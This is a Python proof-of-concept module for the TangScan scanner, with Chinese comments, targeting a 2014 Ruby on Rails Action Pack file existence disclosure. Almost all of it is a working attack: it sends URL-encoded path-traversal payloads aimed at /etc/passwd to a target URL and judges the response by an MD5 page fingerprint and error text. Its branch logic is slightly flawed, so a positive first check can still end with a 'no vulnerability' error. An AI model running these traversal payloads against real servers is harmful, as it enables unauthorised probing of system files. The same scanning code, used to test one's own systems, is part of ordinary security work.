#! /usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import random
import string
import hashlib
from bs4 import BeautifulSoup
from modules.exploit import TSExploit

payload1='%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
payload2='%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwdX'

random_url = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(12))

seed = "6cc3545f1d476b4b4e9f0785b4811be5"



class TangScan(TSExploit):
    """
    类名必须是TangScan，而且需要继承于TSExploit

    """
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "Ruby On Rails 文件暴露漏洞",  # 该POC的名称
            "product": "Ruby On Rails",  # 该POC所针对的应用名称, 严格按照 tangscan 主页上的进行填写
            "product_version": ">= 3.0.0",  # 应用的版本号
            "desc": '''
            Arbitrary file existence disclosure in Action Pack''',  # 该POC的描述
            "license": self.license.TS,  # POC的版权信息
            "author": "PyNerd",  # 编写POC者
            "ref": [
                {self.ref.url: "https://groups.google.com/forum/#!topic/rubyonrails-security/23fiuwb1NBA"}  # 引用的url
            ],
            "type": self.type.info_leak,  # 漏洞类型
            "severity": self.severity.medium,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2014-09-17",  # 漏洞公开时间
            "create_date": "2014-09-17",  # POC 创建时间
        }

        self.register_option({
            "url": {  # POC 的参数 url
                "default": "",  # 参数的默认值
                "required": True,  # 参数是否必须
                "choices": [],  # 参数的可选值
                "convert": self.convert.url_field,  # 参数的转换函数
                "desc": ""  # 参数的描述
            }
        })

        self.register_result({
            "status": False,  # POC 的返回状态
            "data": {
            "page_info": {
                    "content": ""
                }
            },  # POC 的返回数据
            "description": "",  # POC 返回对人类良好的信息
            "error": ""  # POC 执行失败的原因
        })

    def verify(self):

        target = self.option.url

        request = requests.get(target + random_url)  #random url

        request1 = requests.get(target + payload1) # win payload 

        request2 = requests.get(target + payload2)

        #print request1.content

        page_hash =  hashlib.md5(request.content)

        #print page_hash.hexdigest()
       

        if  page_hash.hexdigest() == seed and "File not found:" in request1.content:
            soup = BeautifulSoup(request.content,"html.parser")
            #print request1.content
            items = soup.findAll('h1')

            for item in items:
                            content = item.text
                            self.result.status = True
                            self.result.result = content
                            self.result.description = "目标 {target} 页面返回{content1}".format(
                            target=self.option.url,
                            content1=request1.content)

        if  page_hash.hexdigest() == seed and "File not found:" not in request2.content:
            soup = BeautifulSoup(request2.content,"html.parser")
            #print request1.content
            items = soup.findAll('h1')

            for item in items:
                            content = item.text
                            self.result.status = True
                            self.result.result = content
                            self.result.description = "目标 {target} 页面返回{content1}".format(
                            target=self.option.url,
                            content1=content)


        else:
            self.result.error = "不存在漏洞"
            
   
    def exploit(self):
        self.verify()


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
